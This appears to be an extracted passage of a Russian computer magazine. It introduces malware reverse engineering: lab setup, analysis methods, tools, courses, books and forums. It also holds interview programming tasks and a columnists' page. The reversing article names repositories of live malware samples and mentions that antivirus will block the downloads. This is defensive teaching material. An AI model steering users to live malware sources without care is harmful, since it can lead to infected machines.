отладочных техник. По сравнению с анализом малвари тут возникает очень
много весьма тонких нюансов. Во-первых, реверсинг ПО в абсолютном боль-
шинстве случаев запрещается лицензионным соглашением, так что любые по-
пытки что-то изучить в «образовательных целях» совершаются только на свой
страх и риск. Анализ же малвари таких ограничений не содержит, более того,
это «дело благородное» — к примеру, изучив, каким образом ramsomware
шифрует файлы жертвы, можно попробовать создать для нее декриптор, что,
кстати, очень часто и делают разработчики антивирусного ПО. Во-вторых, ре-
версинг, как правило, направлен в сторону коммерческого ПО, делающего
из trial или незарегистрированной версии ПО вполне рабочую (warez). Иными
словами, это распространение пиратских копий ПО. Эти действия нарушают
множество статей авторского и интеллектуального права, патентного законо-
дательства, международных соглашений и тому подобного.


Хорошая статья о правовых основах реверсинга



Несмотря на неодобрение большинства представителей власти, ИТ-бизне-
са и закона, в хакерском смысле реверсинг имеет и положительные стороны.
К примеру, благодаря изучению программного обеспечения многие эксперты
по безопасности обнаружили различные недокументированные возможности
в ПО, которые обернулись большим скандалом для вендоров и производите-
лей. Сюда же можно отнести и найденные 0day-уязвимости, которые не афи-
шировались на публику до выпуска официальных патчей. Поклонникам open
source, скорее всего, известен термин Clean room design, иными словами —
способ копирования дизайна без нарушения авторских прав и коммерческой
тайны разработчика. Так, к примеру, поступают с проприетарными графиче-
скими драйверами Nvidia под Linux-системы, пытаясь воссоздать оригиналь-
ную архитектуру, чтобы выпустить open source драйвер.

ГОТОВИМ ДОМАШНЮЮ ЛАБОРАТОРИЮ
Самый простой способ (и самое гибкое решение) создать тестовую домаш-
нюю лабораторию для изучения малвари — установить виртуальную машину
на настольный компьютер или ноутбук. Помимо того что виртуальные ОС по-
зволяют обезопасить свою рабочую среду от случайного разрушения при ра-
боте с вредоносами, ты еще и сэкономишь кучу времени и усилий на развора-
чивание стендов, используя все преимущества снапшотов и V2V-копирования.
  Из виртуальных сред наиболее доступны VirtualBox, MS Hyper-V и QEMU.
   Запуская одновременно несколько виртуальных систем на одном физиче-
ском компьютере, ты можешь анализировать вредоносное ПО, которое пыта-
ется взаимодействовать с другими системами, получая/передавая команды,
отправляя данные в сеть и тому подобное.
   Некоторые продвинутые вредоносы научились определять, что они запу-
щены в виртуальной среде, и это, конечно, можно рассматривать как недоста-
ток. Однако это прекрасный шанс потренироваться и применить некоторые
техники, позволяющие произвести реверсинг малвари даже в таком случае.

МЕТОДЫ АНАЛИЗА ВРЕДОНОСНЫХ ПРОГРАММ
Чаще всего при анализе вредоносного программного обеспечения в нашем
распоряжении будет только бинарник, то есть исполняемый файл или библи-
отека, скомпилированный в двоичном виде. Для того чтобы понять, как этот
файл, а точнее его бинарный код работает, нужно будет использовать специ-
альные инструменты и приемы. Существует два основных подхода к анализу
вредоносных программ: статический и динамический. При статическом ана-
лизе вредоносные программы изучают, не запуская малварь на исполнение.
Динамический же анализ включает в себя запуск вре-
доносных программ и манипуляции с запущенным
процессом в оперативной памяти. Также оба метода
условно можно разделить на базовый и продвинутый
анализ. Базовый статический анализ состоит из изу-
чения исполняемого файла без просмотра машин-
                                                       INFOных инструкций. По сути, это первичный анализ, ко-
торый может либо подтвердить, либо опровергнуть         Многие думают,
предположение о том, что файл вредоносен. Базо-      что reversing — это только
                                                                     взлом коммерческоговый динамический анализ связан с запуском вредо-                                                       ПО для превращения
носного кода и наблюдением его поведения в целе-                                                                 программ в warez. На самом
вой системе с помощью специальных инструментов.    деле reversing — это гораздо
Продвинутый статический анализ подразумевает под     больше и глубже. Теми же
                                                                     методами, что и крекеры,
собой загрузку исполняемого файла в дизассемблер                                                                        пользуются эксперты
без запуска кода в оперативной памяти и просмотр       по информационной
ассемблерных инструкций на предмет того, что дела-          безопасности,
                                                                  анализирующие malwareет код программы в целевой системе. Продвинутый                                                                   или изучающие уязвимости
динамический анализ использует отладчик для изуче-      и недокументированные
ния внутреннего состояния выполняемого кода в опе-         возможности ПО.
ративной памяти.

ОСНОВНЫЕ ИНСТРУМЕНТЫ
ДЛЯ ИССЛЕДОВАНИЙ
Ниже мы рассмотрим самые основные и широко используемые утилиты, пре-
вращающиеся в умелых руках в грозные инструменты. По аналогии с описан-
ными выше методами, все инструменты условно можно разделить на инстру-
менты статического и динамического анализа.

1. Некоторые инструменты статического анализа
PEiD

                                         Анализатор
                                        бинарных
                                       файлов PEiD





PEiD — это небольшое приложение, которое используется для анализа бинар-
ного файла и обнаружения стандартных упаковщиков, крипторов и компилято-
ров. Авторы вредоносов часто пытаются упаковать или обфусцировать свои
творения, чтобы сделать их более трудными для обнаружения и анализа.
   PEiD использует базу сигнатур/артефактов (байтовые последовательно-
сти). Такие последовательности характерны для исполняемых/бинарных фай-
лов, полученных в результате компиляции или упаковки. PEiD ищет данные сиг-
натуры в исполняемом/бинарном файле (на момент написания статьи их было
доступно 470).

Dependency Walker





                                                                Утилита Walker

Еще один основной инструмент анализа вредоносных программ — Walker. Это
бесплатное приложение, которое можно использовать для сканирования 32-
и 64-битных модулей Windows (.ехе, библиотеки DLL, .ocx и так далее) и по-
лучения списка всех импортируемых и экспортируемых функций. Walker так-
же отображает детальную информацию о файлах, включая путь файла, номер
версии, тип машины, отладочную информацию.

Resource Hacker





                                                        Утилита Resource Hacker

Resource Hacker — это бесплатное приложение для извлечения ресурсов из би-
нарников Windows-программ. Resource Hacker позволяет добавлять, извлекать
и изменять строки, изображения, меню, диалоги, VersionInfo, манифест.

PEview





                                        Просмотрщик бинарных файлов PEview

Бесплатный и простой в использовании инструмент PEview позволяет просма-
тривать информацию, хранящуюся в таблице PE-заголовков файлов и в раз-
личных сегментах файла.

FileAlyzer





                                                              Утилита FileAlyzer

FileAlyzer — бесплатный инструмент для чтения информации, хранящейся
в PE-заголовках файлов, но предлагает немного больше функций и возможно-
стей, чем PEview.

2. Некоторые инструменты динамического анализа
Procmon





                                                               Утилита Procmon

Procmon, он же Process Monitor, — это бесплатный инструмент, разработан-
ный для пакета Windows Sysinternals, используется для мониторинга файловой
системы ОС Windows, реестра и процессов в реальном времени. Инструмент
представляет собой комбинацию двух старых инструментов — утилиты Filemon
и Regmon.

Process Explorer





                                                        Утилита Process Explorer

Process Explorer — это бесплатный инструмент от Microsoft, который часто ис-
пользуется при выполнении динамического анализа вредоносных программ.
Программа показывает, какие приложения и DLL-файлы выполняются и загру-
жаются для каждого процесса.

Regshot
                           Regshot — это отличная утилита с открытым ко-
                       дом для мониторинга изменений реестра с воз-
                        можностью моментального  снимка, который
                       можно сравнить с эталонным состоянием рее-
                              стра. Это позволяет видеть изменения, внесен-
                        ные после того, как вредоносная программа
                         была запущена в системе.



                               Утилита Regshot

ApateDNS





Еще один отличный инструмент для динамического анализа вредоносных про-
грамм. ApateDNS позволяет контролировать запросы/ответы от DNS-службы
и выступает в качестве DNS-сервера на локальном компьютере. ApateDNS мо-
жет заменить штатную службу DNS-ответов на DNS-запросы, генерируемые
вредоносными программами на определенный IP-адрес.

Netcat





                                                  Швейцарский нож Netcat

Netcat — это инструмент для чтения и записи в сетевых подключениях по про-
токолу TCP и UDP. Программа, зарекомендовавшая себя как швейцарский ар-
мейский нож из-за многих возможностей, которые она предлагает: тут и скани-
рование портов, и переадресация портов, и туннелирование прокси, и многое
другое.

Wireshark





                                           Анализатор сетевых пакетов Wireshark

Wireshark — это один из лучших сетевых инструментов анализаторов семей-
ства TCP/IP. Wireshark используют для анализа сетевой активности, чтобы мак-
симально подробно увидеть, что происходит в данный момент в сети, он дает
возможность захватить пакеты, сдампив их в файл.

INetSim





                                               Симулятор сетевых служб INetSim

INetSim — это инструмент для Linux, позволяющий анализировать вредонос-
ные программы, моделируя наиболее распространенные интернет-сервисы,
такие как HTTP, HTTPS, DNS, FTP и многие другие.



                           Продолжение статьи
MALWARE


     Начало статьи
REVERSING
MALWARE
ДЛЯ НАЧИНАЮЩИХ
   ЧАСТЬ 0: ВВЕДЕНИЕ В РЕМЕСЛО



3. Специализированные инструменты для продвинутого анализа
OllyDbg, лидер среди отладчиков





                                                             Отладчик OllyDbg

Согласно описанию автора, это отладчик со встроенным 32-битным ассем-
блером и интуитивным интерфейсом. Поддерживает все инструкции вплоть
до SSE. Также к нему есть SDK для разработки плагинов. OllyDbg выгодно
отличается от классических отладчиков (таких, как устаревший SoftICE) инту-
итивно понятным интерфейсом, подсветкой специфических структур кода,
простотой в установке и запуске. По этим причинам OllyDbg рекомендуют к ис-
пользованию даже новичкам. Очень приятная утилитка. Кстати, если ты старый
читатель нашего журнала, то ты наверняка заметил термин «устаревший», ко-
торый мы применили к каноническому SoftICE. Вынужден признаться, что это
правда. SoftICE действительно довольно раритетный отладчик уровня ядра,
Syser Kernel Debugger в настоящий момент наиболее актуальная альтернати-
ва. Тем не менее из уважения к Крису Касперски чуть ниже мы посвятим пару
слов и SoftICE :).
   Кстати, OllyDbg работает исключительно с x32 исполняемыми файлами.
Для х64 обрати внимание на x64dbg.

WinDbg, отладчик уровня ядра под Windows





                                                             Отладчик WinDbg

Многоцелевой отладчик для ОС Windows WinDbg распространяется самой
компанией Microsoft. Он может быть использован для отладки приложений
в режиме пользователя, драйверов устройств и самой операционной системы
в режиме ядра. Имеет графический пользовательский интерфейс (GUI), под-
робную справку и множество адаптаций.

Старый добрый отладчик SoftICE





                                                             Отладчик SoftICE

SoftICE — отладчик режима ядра для ОС Windows. Программа была разрабо-
тана для управления процессами на низком уровне Windows, причем таким об-
разом, чтобы операционная система не распознавала работу отладчика.

Легендарный дизассемблер IDA Pro





                                                        Дизассемблер IDA Pro

IDA Pro Disassembler — интерактивный дизассемблер, который широко ис-
пользуется для реверс-инжиниринга. Отличается исключительной гибкостью,
наличием встроенного командного языка, поддерживает множество форма-
тов исполняемых файлов для большого числа процессоров и операционных
систем. Позволяет строить блок-схемы, изменять названия меток, просматри-
вать локальные процедуры в стеке и многое другое.

Дистрибутив для форензики REMnux





                                                ОС для форензики REMnux

REMnux — это специализированный Linux-дистрибутив, построенный на па-
кетной базе Ubuntu. Дистрибутив предназначен для изучения и обратного
инжиниринга кода вредоносных программ. REMnux обеспечивает изолиро-
ванное лабораторное окружение, в котором можно эмулировать работу ата-
куемого сетевого сервиса и изучать поведение вредоносного ПО в условиях,
приближенных к реальным. В комплект дистрибутива включены инструменты
для анализа вредоносного ПО, утилиты для проведения обратного инжини-
ринга кода, программы для изучения модифицированных злоумышленниками
PDF и офисных документов, средства мониторинга активности в системе.

4. Песочницы и изолированные среды
•  Cuckoo Sandbox — песочница из мира open source с открытым исходным
   кодом программного обеспечения для автоматизации анализа подозри-
   тельных файлов.
•  DroidBox — песочница предназначена для динамического анализа прило-
   жений под Android.
• Malwasm — это мощный инструмент, основанный на Cuckoo Sandbox и при-
   званный помочь исследователям проводить анализ кода шаг за шагом, до-
   кументировать все выполняемые события и составлять детальный отчет обо
   всех действиях вредоносных программ.

Более подробное описание инструментов можно получить на GitHub.

ОБЗОР УЧЕБНЫХ КУРСОВ, ТРЕНИНГОВ, САЙТОВ,
РЕПОЗИТОРИЕВ

Открытые университеты и курсы по обучению исследованию
malware-кода
Можно найти довольно много полезного материала и, что очень важно, прак-
тических заданий для совершенствования своих скиллов в данном направле-
нии.
1. Malware Analysis Tutorials: a Reverse Engineering Approach (Author: Dr. Xiang
   Fu) — это настоящий кладезь знаний, руководство, описывающее методи-
   ческий подход к реверсу вредоносного кода с основ до глубокого анализа.
  Один из самых лучших материалов в открытом доступе. Тем, кто хочет по-
   нять концептуальные основы анализа и общую методологию исследования,
   к прочтению обязательно!
2. Перевод на русский описанного выше документа, представленный Prosper-H,
    coldfire, ximera. Подойдет тем, кто пока что плохо понимает английский.
3. Онлайн-курс Free Malware Analysis Training Class from Cybrary, состоящий
   из семи обучающих модулей, построенных по принципу от простого к слож-
   ному, включает в себя все основные темы: статический и динамический
   анализ, расширенный анализ, распаковка и практические лабораторные
   работы. Полный курс длится девять часов, после него можно сдать серти-
   фикационный экзамен.
4. Cheat Sheet for Analyzing Malicious Software от Ленни Зельцера (Lenny
    Zeltser) — несколько небольших шпаргалок по анализу вредоносного ПО.

Наиболее интересные платные обучающие курсы
1. Платный курс от университета SANS под названием FOR610: Reverse-
   Engineering Malware: Malware Analysis Tools and Techniques. Курс рассчитан
   на четыре месяца обучения, состоит из шести обучающих модулей, каждый
   подкреплен практическими работами. Затрагиваются темы: компьютерная
   форензика, первичный и детальный анализ вредоносного ПО, использова-
   ние утилит мониторинга сети, дизассемблера, отладчика и многих других
   полезных инструментов. Курс обойдется в кругленькую сумму от 5000 USD.
2. Платный обучающий курс от компании FireEye рассказывает с самых основ
   о техниках быстрого и продвинутого анализа малвари. На сайте можно оз-
   накомиться с программой курса. Сам курс рассчитан как на новичков, так
   и на более продвинутых слушателей, длится от двух до четырех дней и вклю-
   чает в себя теоретический и практически материал.
3. Еще один платный курс от компании ThreatTrack демонстрирует возможно-
   сти анализа малвари с использованием специально разработанного ком-
   панией инструмента — песочницы ThreatAnalyzer. Для зарегистрированных
   пользователей существует возможность попробовать 30-дневную три-
   ал-версию.

Форумы
1. Tuts 4 You — англоязычный форум, один из самых популярных и авторитетных
   среди подобных, целиком посвящен вопросам реверсинга ПО, в том числе
   анализу вредоносов. Имеется и русскоязычная ветка, где обитает большое
   количество соотечественников, готовых поделиться опытом и образцами.
2. eXeL@B — крупнейший форум в русскоязычном сегменте сети, также цели-
   ком сфокусированный на изучении и анализе программ, реверсинге и всем,
   что с этим связано.

Авторские сайты и блоги
1. Блог Роберта Галвана, посвященный вопросам безопасности и, в частно-
   сти, исследованию малвари. Автор разместил несколько статей с описани-
  ем анализа.
2. Авторский сайт Мэтта Бриггса и Франка Поца (Matt Briggs & Frank Poz), це-
   ликом посвященный изучению реверсинга вредоносного ПО. На сайте есть
   цикл лекций по двухдневному тренингу. Для скачивания доступны лекцион-
   ные материалы, презентации и образцы исследуемых объектов.

Книги
Книги по исследованию программного обеспечения и обратной разработке —
литература весьма специфическая и узкоспециализированная. Поэтому их из-
дано очень мало, и русскоязычных (переводных) среди них единицы. Однако,
на радость нам, есть достойные экземпляры.
1. Practical Malware Analysis: The Hands-On
   Guide to Dissecting Malicious Software.
Книга Practical Malware Analysis представля-
ет собой некое подобие учебного пособия,
где подробно описываются рабочие ин-
струменты и техники реверсинга, а в конце
почти всех глав приводится список лабо-
раторных работ к изложенному материалу.
С каждой новой главой читатель узнает все
больше и закрепляет знания на все услож-
няющихся лабораторных работах.
   Доставшаяся мне книга была без CD
с лабами, но, как заверяет описание, их
можно найти на официальном сайте книги.



2. Practical Reverse Engineering: x86, x64,
  ARM, Windows Kernel, Reversing Tools,
   and Obfuscation.
Тоже весьма интересная книга с упором
на практический реверс-инжиниринг, на-
целенная прежде всего на аналитиков, ин-
женеров по безопасности и системных
программистов. В книге рассматривают-
ся архитектуры x86, x64 и ARM, а также де-
тально режим ядра Windows, технологии
rootkit, методы обфускации, антиотладоч-
ные трюки. Текст насыщен практическими
упражнениями и реальными примерами.
Книга больше касается именно реверсинга
софта, чем анализа малвари, но однознач-
но пригодится!

3. Reversing: Secrets of Reverse Engineering.
Книга очень похожа на предыдущую — это
тоже практическое руководство по ревер-
сингу программного обеспечения. Каждая
глава  начинается  с  теории,  объяснения
тех или иных принципов, подходов, далее
демонстрируются  примеры  практических
действий. Иллюстрируются технологии ди-
сассемблирования, разбора машинных ин-
струкций на языке ассемблера. Затронуты
вопросы  взаимодействия  анализируемой
программы со сторонними библиотеками.
В общем, отличное чтиво!



4. Reverse Engineering for Beginners free book, Денис Юричев.
Книга нашего соотечественника Дениса Юричева (сайт автора).
   Очень полезное руководство по реверсингу для начинающих на русском
языке. Настоящий кладезь знаний, почти тысяча страниц подробнейшего раз-
бора кода, реальных примеров «вскрытия», особенностей отладки в той или
иной ОС, пошаговые руководства к действию. А также упражнения и задачи,
которые доступны на сайте.
   Полную подборку рекомендуемой литературы можно посмотреть здесь.

Сертификация Certified Reverse Engineering Analyst
Точно так же, как для этичных хакеров есть сертификация CEH от организа-
ции Eccouncil, так и для исследователей ПО есть аналогичная Certified Reverse
Engineering Analyst (CREA). Согласно описанию, представленному на офици-
альном сайте организации IACRB, слушатель должен пройти двухмесячный
курс обучения, после чего необходимо сдать сертификационный экзамен, на-
брав минимум 210 баллов из возможных 300 (70%) для получения сертифика-
та. На сайте размещена подробная программа курса и продемонстрированы
несколько практических работ, которые вы-
полняются на курсе. Более подробно о сер-
тификации CREA можно узнать на офици-
альной страничке.

Инструменты и другой софт для ис-
следователя
1. На сайте команды The Legend Of Random
  размещено много материалов по ревер-
   сингу ПО. Отдельная страничка посвя-
  щена инструментам и вспомогательному
   софту, необходимому для проведения
   анализа. Все рассматриваемые инстру-
   менты доступны для свободного скачива-
   ния.
2. Компания AlienVault разместила на сво-
  ем сайте страничку с описанием софта,
   используемого в нашем деле. Приведено подробное описание к каждому
   инструменту, скриншот и ссылка на источник, откуда программу можно за-
   грузить.
3. Файловый архив eXeL@B, наверное, самый большой и полный набор кре-
   керских инструментов из тех, что я когда-либо встречал. Более того, каждую
   программу, документацию, плагины и дополнения можно свободно скачать
   с сайта лаборатории. Для тех, у кого такая возможность отсутствует, есть
   вариант заказать копию сайта на DVD.

DANGER

Будь осторожен при скачивании и распаковке архивов с malware
на компьютер. Все исследования выполняй только в изолированной
виртуальной среде! Не выполняй действий, в которых на 100% не уверен!



Репозитории и базы данных малвари
Настало время поговорить о хранилищах, откуда можно скачать малварь или
отдельные семплы для практических занятий. Помни, при скачивании твой
антивирус, скорее всего, будет блокировать загрузку, поэтому позаботься
об этом заранее. И конечно же, будь осторожен, чтобы случайно не заразить
свой компьютер.
1. Contagio Malware Dump — коллекция последних образцов вредоносов.
2. Das Malwerk — свежие наборы вредоносов на любой вкус.
3. KernelMode.info — репозиторий, заточенный под Win32 и rootkit Windows.
4. DamageLab.in — специализированный форум, где можно найти много по-
   лезного, в том числе выкладываемые исследователями распакованные
   и дешифрованные семплы, методики и рекомендации по их анализу.
5. MalwareBlacklist — ежедневно обновляемая доска blacklisted URLs, зара-
   женных малварью.
6. Open Malware — база данных с возможностью поиска вредоносного файла
   по имени или хешу MD5, SHA-1, SHA-256.
7. ViruSign — база данных малвари, детектируема антивирусом ClamAV.
8. VirusShare — обновляемый репозиторий для исследователей и реверсеров.

Заключение
Теперь, подготовив домашнюю лабораторию и вооружившись рассмотренны-
ми в статье инструментами и образцами малвари, можем приступать к практи-
ческой реализации — анализу кода вредоносного ПО.
  Со следующей статьи мы начнем разбираться в реверсе малвари на реаль-
ных примерах. Всем удачи в исследованиях!


Редакция журнала выражает благодарность Сергею Харламову, вирусному
аналитику «Лаборатории Касперского» за ценные комментарии к тексту статьи.
КОДИНГ





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

        ЗАДАЧИ ОТ VIRTUOZZO
     И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
      ОТ POSTGRES PROFESSIONAL


Как насчет свежей порции облачных ноябрьских задачек?
А вот и нет! Задачки-то обычные, приземленные. «Облач-
ная» — это компания, нам с тобой эти задачи задает. Встре-
чай — Stack Group, которая предоставляет весь спектр со-
ответствующих услуг: IaaS, storage, VDI / VDI GRID, DRaaS
и другие. Облако Stack Group корпоративного класса, по-
строено на базе собственного ЦОД — М1, а также партнер-
ских дата-центров в Москве, Франкфурте и Амстердаме.
Как видишь, работодатель большой и завидный :).



ПРИЗЫ И (ВПЕРВЫЕ В НАШЕЙ РУБРИКЕ!) УТЕШИТЕЛЬНЫЕ
ПРИЗЫ ОТ STACK GROUP
Первым трем правильно решившим: скидка 50% на IaaS в течение года
(а это не шутки).
   Утешительные призы первым пяти решившим правильно, но с незначитель-
ными неточностями: портативное зарядное устройство для телефона.

ЗАДАЧИ
Исходные данные:
order_header — таблица заголовка заказа:

id
  INT DIENTITY(1,1)
  Идентификатор таблицы заказа
reg_number
  VARCHAR(MAX) NOT NULL
  Регистрационный номер заказа
on_date
  DATETIME NOT NULL
  дата формирования заказа

order_details — таблица деталей заказа:

id
  INT IDIENTITY(1,1)
  идентификатор строки деталей заказа
hdr_id
  INT NOT NULL
  идентификатор заказа
good_id
  INT NOT NULL
  идентификатор товара
amount
  DECIMAL(19,4) NOT NULL
  количество товара
price
  DECIMAL(19,2) NOT NULL
  цена за единицу измерения товара для данного заказа


Для реализации на Transact-SQL:
1. Напишите скрипты создания таблиц со связями между собой, скрипты долж-
  ны пересоздавать таблицы.
2. Выберите все заказы и для каждого заказа выберите строку деталей с мак-
   симальной суммарной стоимостью товара в заказе; если детали две, то вы-
   брать одну с максимальной стоимостью единицы товара.
3. Напишите хранимую процедуру, которая выполнит обновление всех зака-
   зов с заданной даты @date_from по заданную дату @date_to , в которых при-
   сутствует товар с заданным идентификатором @good_id_old , и заменит его
   на товар с идентификатором @good_id_new (данный товар тоже может уже
   быть в заказе, его следует также просуммировать с существующим). Задачу
   необходимо выполнить без использования циклов и курсоров.
4. Выполнить предыдущую задачу, если известно, что записей в таблице очень
   много (~10 миллионов) и таблица является высоконагруженной.

Для реализации на C#:
1. Напишите отображения двух таблиц в Entity Framework согласно нотации
  Code First, используя синтаксис Fluent.
2. Напишите выборку LINQ, в которой выберите все заказы и для каждого за-
   каза — строку детали с максимальной суммарной стоимостью товара в за-
   казе; если детали две, то выбрать одну с максимальной стоимостью едини-
  цы товара.

Для реализации на ASP.NET MVC 5, синтаксис представления Razor:
1. Напишите форму в представлении с использованием HTML и разметки Razor
   для редактирования строки создания и редактирования строки заказа.


КУДА СЛАТЬ РЕШЕНИЯ?
Свои варианты ответов шли на pobeditel@stackgroup.ru


НАШ ПОБЕДИТЕЛЬ: JACK BLACK И ЕГО РЕШЕНИЯ

Приз читателю: Virtuozzo Storage на год!
Наши друзья из Virtuozzo подогнали читателю крутой приз — безлимит-
ную по объему триальную лицензию сроком на год. А поскольку формально
она триальная, ставить ее можно на несколько кластеров :).

Задание 1 (Приложение: run.c)
Окружение создается с помощью механизмов Linux namespaces. Создаем ко-
пию дерева ФС для текущего процесса:





Приватно монтируем /dev/shm, чтобы избежать конфликтов семафоров про-
граммы:





Дальше следует обычный exec.

Задание 2 (приложение: json.patch)
Первое, что бросается в глаза, если посмотреть лог strace, — это повторяю-
щиеся системные вызовы каждую итерацию. Например,



Если посмотреть код UUID библиотеки, то можно увидеть





Таким образом, прямой вызов uuid_generate_random() может избавить
от лишней проверки. Однако остается комбинация





Решением может  стать вызов более низкоуровневой функции __uuid_
generate_random библиотеки с указанием количества элементов. Это дает
возможность один раз тратить время на генерацию UUID:



А в цикле делать только преобразования:



Против изначальной издержки итерации:





Конкретно в случае данной программы можно отказаться от использования
JSON-библиотеки:





в пользу форматированного вывода:





Результирующий патч в приложении.

Задание 3 (приложение: buils.sh)
Пример вызова скрипта:

./build.sh -f task2.sfx  -n task2 -r 3
./build.sh -f task2.sfx  -n task2 -r 3

К сожалению, под рукой была только Ubuntu, делал на ней.

РАЗБОР РЕШЕНИЯ ЗАДАЧ ОТ ПОБЕДИТЕЛЯ: КОММЕНТИРУЕТ
ЮРИЙ ПУДГОРОДСКИЙ

Задание 1
В задании требуется понять с помощью strace, отладчика или еще каким-ли-
бо способом, как процессы конфликтуют друг с другом. По итогам запу-
ска strace можно определить, что процесс использует именованные posix
semaphore и shared  memory объекты. В результате параллельно исполняю-
щиеся процессы конкурируют за имя вновь созданных объектов, только пер-
вый создавший объекты может успешно работать.
   Очевидное решение — создать такое runtime-окружение для каждого про-
цесса, в котором пространство имен posix semaphore объектов не пересека-
ется. Ранее для таких задач пользовались методом runtime  interception
системного или библиотечного вызова. В перехваченном вызове подменяли
имя на уникальное для каждого процесса. Одно из таких решений — опреде-
ление собственных shm_open() и sem_open() через LD_PRELOAD, подстановка
уникального имени с PID процесса как части имени и затем вызов оригиналь-
ного API через RTLD_NEXT.
  С появлением в Linux специальной файловой системы с точкой монти-
рования /dev/shm, в пространстве имен которой находятся все semaphore
и shared memory объекты, а также per-process namespace для mount points, ре-
шение может более простым и идеологически общим. В нем мы создаем при-
ватный mount namespace для child process, монтируем в нем свой собствен-
ный экземпляр /dev/shm и исполняем в таком окружении timer process.
  Именно такое решение в современном стиле process namespaces было
выполнено кандидатом — на 100% корректное и элегантное.

ЗАДАНИЕ 2
Аналогично первому заданию предполагается инструментальное runtime-про-
филирование с помощью strace и compile-time профилирование для опреде-
ления узкого места алгоритма. Для начала можно запустить исследуемую про-
грамму под time и обратить внимание на соотношение времени исполнения
в режиме ядра и пользовательском. Время исполнения в ядре оказывается
сравнимым по порядку с пользовательским, что дает нам основание говорить
об узком месте, связанном с использованием системных вызовов. Профили-
рование с помощью strace это подтверждает, также мы получаем не только
время исполнения, но и некоторое представление о задаче, решаемой с по-
мощью этих вызовов.
  Им оказывается алгоритм генерации случайных UUID, основанный на при-
менении стандартной 3rd party библиотеки libuuid. В процессе генерации
libuuid открывает /dev/urandom интерфейс к генератору случайных чисел,
предоставляемому ядром Linux, читает необходимое количество случайных
данных, закрывает FD и создает случайный UUID на полученной основе. Даль-
нейшее исследование показывает, что узким местом оказывается именно
производительность /dev/urandom. Оптимизации, связанные с устранени-
ем многократного повторения stat() или даже модификация исходного тек-
ста, чтобы устранить open()/close() для каждого UUID, лишь незначительно
снижают общее время. Никакой другой интерфейс, предоставляемый libuuid,
не позволяет генерировать большое количество UUID с высокой скоростью.
  Решением проблемы может быть использование своего userspace гене-
ратора случайных чисел с высокой производительностью и принятие специ-
альных мер для уникальности UUID из разных процессов (примешивание
к pseudo-random-данным PID процесса, высокоточной метки времени и так
далее). Другими словами, своя собственная реализация UUID-генератора.
   После устранения libuuid и обращений к /dev/urandom профилирование
покажет, что основная часть userspace-исполнения приходится на JSON-би-
блиотеку. Ее замена на простой форматный printf() дает ускорение прибли-
зительно в три раза и может считаться оправданной в подобных случаях.
  Решение кандидата выполнено по двум пунктам из трех, итого оценка 66%
из 100% возможных:
•  анализ и профилирование — complete;
•  замена /dev/urandom на userspace pseudo-random — not complete;
•  оптимизация JSON-форматирования — complete.

ЗАДАНИЕ 3
Не самое интересное задание, проверяющее умение пакетировать RPM
и скриптово-интеграционные способности.
  В задаче не предполагалось кодирование на языке С, наиболее оптималь-
ным будет автоматический скрипт на Shell/Bash/Python или другом подходя-
щем скриптовом языке. Использование изолированного окружения при за-
пуске самораспаковывающегося исполняемого файла необязательно, так
как оно явно не требуется в техническом задании, но может быть обосновано
соображениями безопасности.
  Решение кандидата — без изоляции процесса распаковки, но с помощью
профессионально оформленного скрипта на Bash. 100%.

   IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!

    Миссия этой мини-рубрики — образовательная, поэтому мы бес-
    платно публикуем качественные задачки, которые различные компа-
    нии предлагают соискателям. Вы шлете задачки на lozovsky@glc.ru —
   мы их публикуем. Никаких актов, договоров, экспертиз и отчетностей.
    Читателям — задачки, решателям — подарки, вам — респект от на-
    шей многосоттысячной аудитории, пиарщикам — строчки отчетности
    по публикациям в топовом компьютерном журнале.
КОДИНГ
 КОЛОНКА
 АВТОРОВ
     ЧТО ИНТЕРЕСНОГО ПРОИЗОШЛО
     С НАШИМИ ПРОГРАММЕРАМИ
              ЗА МЕСЯЦ





                                        Александр Лозовский
                                                         lozovsky@glc.ru





Каждый месяц со страниц рубрики «Кодинг» на тебя смо-
трят самые обычные (просто очень крутые :)) программи-
сты. В свободное от написания статей время они живут
обычной кодерской жизнью — программирование по ра-
боте, поддержка своего софта, выступления на конферен-
циях, опенсорсные проекты...
  В этом месяце мы решили сделать экспериментальную
колонку, в которой не один колумнист, а сразу несколько
авторов расскажут о том, что им показалось интересным
в этом месяце. Мне, кстати, понравилось :).


ВИТАЛИЙ ХУДОБАХШОВ
Недавно выступил на Java-конференции Joker и разобрал вопросы реально-
го применения функционального программирования и особенности стан-
дартной библиотеки Scala, которые правильно было бы считать ошибками.
Очень интересная история с нестандартным порядком аргументов в мето-
де foldLeft, что очень запутывает и не дает каррировать правильно, а также на-
рушение контракта функтора map(g ? f) = map(g) ? map(f) в случае применения
метода map одновременно для ключей и значений словаря (Map). Последний
пример в обыденной жизни означает, что Map.map в каком-то не вполне из-
вестном порядке схлопывает повторяющиеся ключи, если они возникают во
время обработки, а это может приводить к очень большим проблемам. Вооб-
ще, функциональные языки и языки со смешанной парадигмой хороши для тех,
кто умеет всем этим пользоваться.

DEEONIS
Удалось поучаствовать в проекте по созданию нового дистрибутива Linux
с нуля. Соответственно, существенно расширился бэкграунд системных зна-
ний о Linux, о том, как разные компоненты в этой ОС взаимодействуют друг
с другом. Кроме того, пришлось немного пописать софт под этот дистрибу-
тив. В частности, что-то похожее на desktop shell со своим доком и прочими
атрибутами. Главной особенностью этого приложения было то, что оно ис-
пользовало библиотеку XCB для общения с X-сервером. Да-да, не GTK и даже
не XLib, а XCB.
   Эта библиотека является тонкой C-оберткой над протоколом X11 и его
расширениями. Большинство ее кода генерируется из описания протокола
в XML. Основной плюс XCB — полная асинхронность, что существенно повы-
шает производительность GUI-приложений, особенно при сетевом запуске.
Главный минус — это не GUI-фреймворк. Там нет привычных контролов, та-
ких как кнопки или поля ввода. Все это приходилось рисовать вручную, благо
есть библиотека Cairo, которая умеет использовать в качестве бэкенда XCB,
что облегчало непосредственно рисование, но не избавляло от написания ло-
гики работы контролов. В общем, было весело :).

НИКОЛАЙ МАРКОВ
В моем случае новой идеей, которая поставила все с ног на голову, стало ак-
тивное использование CLI-инструментов для ad hoc анализа данных прямо
в консоли. Нет, Pandas и Numpy в Python — штуки отличные, но простые задачи
можно решать быстро и эффективно и без них. GNU Parallel/mawk/sed/csvkit/
jq — и гигабайты и даже терабайты данных за какие-то минуты обсчитываются
на нескольких ядрах. Я уж молчу про Hadoop и Spark. В общем, азы вспомнить
